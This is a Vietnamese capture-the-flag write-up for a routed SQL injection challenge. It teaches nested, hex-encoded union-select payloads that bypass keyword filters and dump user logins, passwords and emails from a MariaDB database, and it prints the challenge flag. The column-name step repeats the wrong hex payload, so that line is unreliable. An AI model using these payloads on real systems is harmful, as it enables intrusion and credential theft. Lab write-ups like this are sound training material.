# SQL Injection - Routed

**Title**: Exploit my requests

**Point**: 35 Points

**Description**: Find the admin password.

## Solution: 

Bài này hơi dài, mình chia làm 2 phần:

<a href="#explain-and-analysis">1. Cho người newbie, cần giải thích</a>

<a href="#exploitation">2. Cho những người đã hiểu Routed SQLi và chỉ cần xem thẳng exploit</a>

### Explain and Analysis:

Chúng ta có một form đăng nhập như mọi lần

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/161787127-6b0366e1-54b9-4850-81fc-60c3fdca89c7.png" > </p>

Tất nhiên, vẫn như mọi lúc nào, cái này chỉ để "bait" thôi 🙃. Nhập `'1` vào không có gì xảy ra, chỉ báo lỗi "Sai User hoặc Password". Tiếp theo chuyển qua Search box, nhập `'1` tiếp tục test: 

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/161787720-0ad24b60-3c2c-42f4-9b02-d21e4a9fd0f0.png" > </p>

Kích lỗi lên thành công, xác định database là **MariaDB**. Giờ test một số ký tự và keyword để kiểm tra filter xí, sau một hồi test thì mình thấy có các filter sau:

Filter: `order` `and` `or` `,`  `"`. 

Với filter này mình có thể encode sang dạng **hex** để bypass.

Ồ kê, mấy cái checking cơ bản đã xong, giờ vào vấn đề chính. Đầu tiên, để hiểu kỹ các bạn nên xem tài liệu có sẵn của challenge (ngắn gọn và khá xúc tích) để hiểu **Route SQL** là gì: [Routed SQL Injection - Zenodermus Javanicus](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt) 

Đại khái, chúng ta có thể hiểu kiểu truy vấn kiểu **Route SQL** là như thế này. Nơi chúng ta có thể inject vào (trong trường hợp này) là trong mệnh đề **WHERE** như mọi khi, nhưng output của câu truy vấn không được thể hiện ra bên ngoài. Vậy nó chạy đi đâu ? Output đó tiếp tục được làm input tại mệnh đề WHERE ở câu truy vấn thứ 2 (một câu truy vấn hoàn toàn khác) rồi output của câu truy vấn thứ 2 này mới hiện lên trang web. Tham khảo hình sau:

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/161792538-0671671a-66f3-4aae-83f9-63f40b1e2f9e.png" > </p>

> Lưu ý: Có ai thắc mắc ai viết code kiểu này thì chịu, nếu nghĩ nó chặn được SQLi thì nhầm to, xong chall sẽ thấy :))

Vậy nên bình thường chúng ta hay sử dụng `union select 'abc', 'xyz', '123', ... -- ` thì sẽ hiện ra **'abc', 'xyz', '123', ...**. Còn trường hợp này thì không hiện ra gì luôn. Thử payload:

```
' union select 1 -- 
```

<p align="center"> <img width=400 height=250 src="https://user-images.githubusercontent.com/48288606/161793129-1be05194-a47d-4a22-98e9-fb27bff4c026.png" > </p>

Thấy lạ chưa ! Ta thấy kết quả trả về có khoảng 3 trường (đoán), vậy mà mình select chỉ có 1 cột thôi mà vẫn cho đúng. Đó là vì cái select 1 của mình không đi vào câu truy vấn thứ 2 để xuất ra output. Vậy ý tưởng là gì? Giả sử chúng ta có câu truy vấn lồng vào nhau dạng vậy thì sao:

```
' union select "'union select 1, 2' -- " -- 
```

Đoạn truy vấn trên có ý nghĩa gì? Đi vào câu truy vấn đầu tiên, `'union select {payload} --` sẽ bypass được mệnh đề WHERE và trả về giá trị của select. Vì vậy tại đây chúng ta lồng thêm một cái `{payload}` cũng là dạng `union select {payload} -- ` thì chuỗi này sẽ là output của câu truy vấn đầu tiên và truyền vào mệnh đề WHERE của câu truy vấn thứ 2 và bypass nó luôn. Mình có thể thực hiện một truy vấn bất kỳ tại chỗ này, thay `select 1` thành select bất kỳ thứ gì mình thích. Ví dụ như payload vừa rồi, nhưng mình sẽ chuyển sang **hex form** để "thông chốt"

> Lưu ý: Để chuyển sang hex form cho nhanh với một chuỗi mong muốn, ta dùng hàm **HEX()** trên MariaDB cho nhanh. Sau khi chuỗi chuyển sang hex form thì không cần cặp ngoặc kép hay ngoặc đơn nữa.

<p align="center"> <img width=330 height=200 src="https://user-images.githubusercontent.com/48288606/161796330-69c07409-5555-41a6-8a4b-52726f45814f.png" > </p>

Payload injected to second query: `' union select 1, 2 -- ` --> Hex form: `0x2720756E696F6E2073656C65637420312C2032202D2D20`

Payload: 
```
' union select 0x2720756E696F6E2073656C65637420312C2032202D2D20 -- 
```

<p align="center"> <img width=600 height=200 src="https://user-images.githubusercontent.com/48288606/161796759-496cb615-f500-4160-9109-c3ee5580f1a6.png" > </p>

Trùng khớp số cột trả về luôn (2 cột), đồng thời giá trị trường đầu tiên hiển thị là đoạn ta inject vào **WHERE** trong câu truy vấn thứ 2 . Thử select `@@version` trên MariaDB:

Payload injected to second query: `' union select 1, @@version -- ` --> Hex form: `0x2720756E696F6E2073656C65637420312C20404076657273696F6E202D2D20`

Payload: 
```
' union select 0x2720756E696F6E2073656C65637420312C20404076657273696F6E202D2D20  -- 
```

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/161798457-f3c64315-4b1e-483e-b9db-2e433e2599e5.png" > </p>

Mượt luôn. Xong 90% rồi, giờ thì mình khai thác như một bài bình thường thôi.

### Exploitation:

Tìm tên bảng:

Payload injected to second query: `' union select 1, group_concat(table_name) from information_schema.tables -- ` 

--> Hex form: `0x2720756E696F6E2073656C65637420312C2067726F75705F636F6E636174287461626C655F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E7461626C6573202D2D20`

Payload: 
```
' union select 0x2720756E696F6E2073656C65637420312C2067726F75705F636F6E636174287461626C655F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E7461626C6573202D2D20 -- 
```

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/161799078-b7f4972a-4e9e-45c1-8066-0dbccf840cc5.png" > </p>

> Lưu ý: tên bảng thường được lưu ở dưới cùng, kéo thanh ribbon qua hết sẽ thấy.

Tìm ra tên bảng là `users`. Giờ tìm tên cột của bảng này:

Payload injected to second query: `' union select 1, group_concat(column_name) from information_schema.columns where table_name='users' -- ` 

--> Hex form: `0x2720756E696F6E2073656C65637420312C2067726F75705F636F6E63617428636F6C756D6E5F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E636F6C756D6E73207768657265207461626C655F6E616D653D27757365727327202D2D20`

Payload: 
```
' union select 0x2720756E696F6E2073656C65637420312C2067726F75705F636F6E636174287461626C655F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E7461626C6573202D2D20 -- 
```

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/161800087-c40d6c31-e513-43ae-a379-01d8eaafe9b0.png" > </p>

Lấy tất cả thông tin ra.

Payload injected to second query: `' union select 1, group_concat(id, ':', login, ':', password, ':', email) from users -- ` 

--> Hex form: `0x2720756E696F6E2073656C65637420312C2067726F75705F636F6E6361742869642C20273A272C206C6F67696E2C20273A272C2070617373776F72642C20273A272C20656D61696C292066726F6D207573657273202D2D20 `

Payload: 
```
' union select 0x2720756E696F6E2073656C65637420312C2067726F75705F636F6E6361742869642C20273A272C206C6F67696E2C20273A272C2070617373776F72642C20273A272C20656D61696C292066726F6D207573657273202D2D20 --
```

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/161800984-29c0cbb6-37bc-4eca-a9d7-3059a301ffb1.png" > </p>

We've had it done !!! 🤪

> NOTE: Bản thân mình thấy bài này mang lại cách exploit mới, cần brainstorm tí. Nhưng mà có một điều mình không hiểu và đặt một câu hỏi lớn là AI LẠI CHƠI QUERY 2 LẦN THẾ NÀY? Mình thấy nó không thực tế lắm (' ~ '), ra để giải bài tập thì được

Flag: **qs89QdAs9A**
